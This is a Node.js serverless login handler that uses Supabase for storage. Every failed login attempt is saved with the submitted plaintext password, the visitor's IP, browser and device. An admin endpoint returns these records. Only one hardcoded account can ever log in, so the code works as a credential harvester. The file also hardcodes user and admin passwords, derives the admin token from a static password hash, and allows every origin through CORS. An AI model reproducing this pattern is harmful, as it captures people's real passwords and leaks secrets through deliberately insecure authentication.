const crypto = require('crypto');

// ─── Constants ────────────────────────────────────────────────────────────────
const VALID_USER  = 'nikhil';
const VALID_PASS  = '123456';
const ADMIN_USER  = 'shivanshu.bnd';
const ADMIN_PASS  = 'Sahu@7897';

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_KEY;

// ─── Token ───────────────────────────────────────────────────────────────────
function makeToken() {
    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
}

// ─── Supabase helpers ─────────────────────────────────────────────────────────
async function insertLog(entry) {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/failed_logins`, {
        method: 'POST',
        headers: {
            'apikey':        SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type':  'application/json',
            'Prefer':        'return=minimal'
        },
        body: JSON.stringify(entry)
    });
    if (!res.ok) throw new Error(`Supabase insert failed: ${res.status}`);
}

async function fetchLogs() {
    const res = await fetch(
        `${SUPABASE_URL}/rest/v1/failed_logins?order=id.desc&limit=1000`,
        {
            headers: {
                'apikey':        SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`
            }
        }
    );
    if (!res.ok) throw new Error(`Supabase fetch failed: ${res.status}`);
    return res.json();
}

// ─── Main Handler ─────────────────────────────────────────────────────────────
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');

    // ── Admin: GET logs ──────────────────────────────────────────────────────
    if (req.method === 'GET') {
        const token = req.headers['x-admin-token'];
        if (token !== makeToken()) return res.status(401).json({ error: 'Unauthorized' });

        try {
            const logs = await fetchLogs();
            // Format for frontend compatibility
            const formatted = logs.map(l => ({
                id:        l.id,
                timestamp: l.timestamp,
                username:  l.username,
                password:  l.password,
                browser:   l.browser,
                device:    l.device,
                ip:        l.ip
            }));
            return res.status(200).json({ logs: formatted });
        } catch (e) {
            console.error('❌ Fetch logs error:', e.message);
            return res.status(500).json({ error: e.message });
        }
    }

    // ── Admin: login ─────────────────────────────────────────────────────────
    if (req.method === 'POST' && req.body?.action === 'admin-login') {
        const { username, password } = req.body;
        if (username === ADMIN_USER && password === ADMIN_PASS) {
            return res.status(200).json({ success: true, token: makeToken() });
        }
        return res.status(200).json({ success: false });
    }

    // ── User login ───────────────────────────────────────────────────────────
    if (req.method === 'POST') {
        const { username, password } = req.body || {};
        const isValid = (username === VALID_USER && password === VALID_PASS);

        if (!isValid) {
            const ua = req.headers['user-agent'] || '';
            let browser = 'Unknown';
            if (ua.includes('Chrome') && !ua.includes('Edg'))         browser = 'Chrome';
            else if (ua.includes('Firefox'))                           browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg'))                               browser = 'Edge';
            else if (ua.includes('OPR') || ua.includes('Opera'))      browser = 'Opera';

            const device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
            const ip     = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown';
            const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

            // Fire-and-forget — don't slow down the response
            insertLog({ timestamp, username: username || '', password: password || '', browser, device, ip })
                .catch(e => console.error('❌ Log insert error:', e.message));
        }

        return res.status(200).json({ success: isValid });
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
